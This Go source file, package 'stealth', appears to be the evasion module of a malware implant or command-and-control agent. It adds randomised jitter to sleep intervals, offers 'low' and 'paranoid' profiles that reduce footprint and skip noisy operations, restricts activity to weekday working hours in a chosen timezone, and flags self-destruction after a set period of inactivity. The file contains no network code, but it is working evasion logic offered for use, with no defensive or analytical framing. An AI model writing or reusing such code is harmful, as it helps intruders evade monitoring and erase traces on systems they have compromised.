package stealth

import (
	"math/rand"
	"sync"
	"time"
)

type Profile int

const (
	ProfileNormal  Profile = iota
	ProfileLow             // reduced frequency, skip noisy ops
	ProfileParanoid        // minimal footprint, long sleep, working-hours only
)

type Config struct {
	Profile          Profile
	BaseInterval     time.Duration
	MaxJitterPct     float64 // 0.0–1.0
	WorkingHoursOnly bool
	WorkStart        int // hour 0-23
	WorkEnd          int // hour 0-23
	Timezone         *time.Location
	MaxIdleBeforeKill time.Duration // self-destruct after inactivity
}

func DefaultConfig() Config {
	return Config{
		Profile:          ProfileNormal,
		BaseInterval:     60 * time.Second,
		MaxJitterPct:     0.3,
		WorkingHoursOnly: false,
		WorkStart:        8,
		WorkEnd:          18,
		Timezone:         time.UTC,
		MaxIdleBeforeKill: 0,
	}
}

type Mode struct {
	mu       sync.RWMutex
	cfg      Config
	lastTask time.Time
	rng      *rand.Rand
}

func New(cfg Config) *Mode {
	return &Mode{
		cfg:      cfg,
		lastTask: time.Now(),
		rng:      rand.New(rand.NewSource(time.Now().UnixNano())),
	}
}

func (m *Mode) SetProfile(p Profile) {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.cfg.Profile = p
	switch p {
	case ProfileLow:
		m.cfg.BaseInterval = 5 * time.Minute
		m.cfg.MaxJitterPct = 0.5
	case ProfileParanoid:
		m.cfg.BaseInterval = 30 * time.Minute
		m.cfg.MaxJitterPct = 0.8
		m.cfg.WorkingHoursOnly = true
	case ProfileNormal:
		m.cfg.BaseInterval = 60 * time.Second
		m.cfg.MaxJitterPct = 0.3
		m.cfg.WorkingHoursOnly = false
	}
}

func (m *Mode) SleepDuration() time.Duration {
	m.mu.RLock()
	defer m.mu.RUnlock()

	base := m.cfg.BaseInterval
	jitter := time.Duration(float64(base) * m.cfg.MaxJitterPct * m.rng.Float64())

	if m.rng.Intn(2) == 0 {
		return base + jitter
	}
	return base - jitter/2
}

func (m *Mode) IsWithinWorkingHours() bool {
	m.mu.RLock()
	defer m.mu.RUnlock()

	if !m.cfg.WorkingHoursOnly {
		return true
	}

	now := time.Now()
	if m.cfg.Timezone != nil {
		now = now.In(m.cfg.Timezone)
	}

	hour := now.Hour()
	weekday := now.Weekday()
	if weekday == time.Saturday || weekday == time.Sunday {
		return false
	}
	return hour >= m.cfg.WorkStart && hour < m.cfg.WorkEnd
}

func (m *Mode) ShouldSelfDestruct() bool {
	m.mu.RLock()
	defer m.mu.RUnlock()

	if m.cfg.MaxIdleBeforeKill == 0 {
		return false
	}
	return time.Since(m.lastTask) > m.cfg.MaxIdleBeforeKill
}

func (m *Mode) RecordActivity() {
	m.mu.Lock()
	defer m.mu.Unlock()
	m.lastTask = time.Now()
}

func (m *Mode) IsNoisyOpAllowed() bool {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.cfg.Profile == ProfileNormal
}

func (m *Mode) GetProfile() Profile {
	m.mu.RLock()
	defer m.mu.RUnlock()
	return m.cfg.Profile
}

func (m *Mode) SleepWithStealth() {
	dur := m.SleepDuration()

	if !m.IsWithinWorkingHours() {
		nextWork := m.nextWorkingHourStart()
		if nextWork > dur {
			dur = nextWork
		}
	}

	time.Sleep(dur)
}

func (m *Mode) nextWorkingHourStart() time.Duration {
	m.mu.RLock()
	defer m.mu.RUnlock()

	now := time.Now()
	if m.cfg.Timezone != nil {
		now = now.In(m.cfg.Timezone)
	}

	next := time.Date(now.Year(), now.Month(), now.Day(), m.cfg.WorkStart, 0, 0, 0, now.Location())
	if now.Hour() >= m.cfg.WorkStart {
		next = next.Add(24 * time.Hour)
	}
	for next.Weekday() == time.Saturday || next.Weekday() == time.Sunday {
		next = next.Add(24 * time.Hour)
	}
	return time.Until(next)
}
